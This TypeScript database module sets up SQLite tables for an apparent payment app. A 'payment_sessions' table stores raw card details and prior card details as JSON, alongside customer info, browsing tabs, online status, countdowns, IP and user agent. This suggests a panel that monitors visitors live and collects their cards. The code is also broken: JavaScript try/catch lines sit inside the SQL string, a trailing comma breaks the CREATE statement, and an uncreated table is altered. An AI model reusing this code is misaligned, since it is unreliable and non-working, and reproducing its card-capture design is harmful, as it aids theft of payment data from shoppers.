import initSqlJs from 'sql.js';
import { readFileSync, writeFileSync, existsSync, mkdirSync } from 'fs';
import { resolve, dirname } from 'path';

const DB_PATH = resolve(process.cwd(), '../../data/payment.db');

let db: any = null;

export async function getDb(): Promise<any> {
  if (db) return db;

  mkdirSync(dirname(DB_PATH), { recursive: true });

  const SQL = await initSqlJs();
  if (existsSync(DB_PATH)) {
    const buf = readFileSync(DB_PATH);
    db = new SQL.Database(buf);
  } else {
    db = new SQL.Database();
  }
  db.run('PRAGMA journal_mode=WAL; PRAGMA foreign_keys=ON;');
  return db;
}

export function save() {
  if (db) writeFileSync(DB_PATH, db.export());
}

export async function initTables() {
  const db = await getDb();
  db.run(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      real_name TEXT DEFAULT '',
      email TEXT DEFAULT '',
      phone TEXT DEFAULT '',
      roles TEXT DEFAULT '["R_USER"]',
      status TEXT DEFAULT '1',
      created_at TEXT DEFAULT (datetime('now')),
      updated_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS payment_sessions (
      id TEXT PRIMARY KEY,
      session_id INTEGER,
      customer_id TEXT,
      frontend_url TEXT DEFAULT '',
      status TEXT DEFAULT 'live',
      current_step TEXT DEFAULT 'card',
      card_info TEXT DEFAULT '{}',
      customer_info TEXT DEFAULT '{}',
      browsing_tabs TEXT DEFAULT '[]',
      is_online INTEGER DEFAULT 1,
      countdown_seconds INTEGER DEFAULT 0,
      pending_at TEXT,
      last_card_info TEXT DEFAULT '{}',
      ip TEXT DEFAULT '',
      ua TEXT DEFAULT '',
      created_at TEXT DEFAULT (datetime('now')),
    );
    -- Add ip/ua columns if upgrading from old schema
    try { db.run('ALTER TABLE payment_sessions ADD COLUMN ip TEXT DEFAULT \'\''); } catch(e) {}
    try { db.run('ALTER TABLE payment_sessions ADD COLUMN ua TEXT DEFAULT \'\''); } catch(e) {}
  `);
  // Add raw_json column if upgrading from old schema
  try { db.run('ALTER TABLE bin_cache ADD COLUMN raw_json TEXT'); } catch(e) {}
  save();
}

// Helper: run a query and return array of rows
export function queryAll(sql: string, params: any[] = []): any[] {
  const stmt = db.prepare(sql);
  if (params.length) stmt.bind(params);
  const rows: any[] = [];
  while (stmt.step()) {
    rows.push(stmt.getAsObject());
  }
  stmt.free();
  return rows;
}

// Helper: run and return first row
export function queryOne(sql: string, params: any[] = []): any | null {
  const rows = queryAll(sql, params);
  return rows.length > 0 ? rows[0] : null;
}

// Helper: run a statement
export function run(sql: string, params: any[] = []) {
  db.run(sql, params);
  save();
}
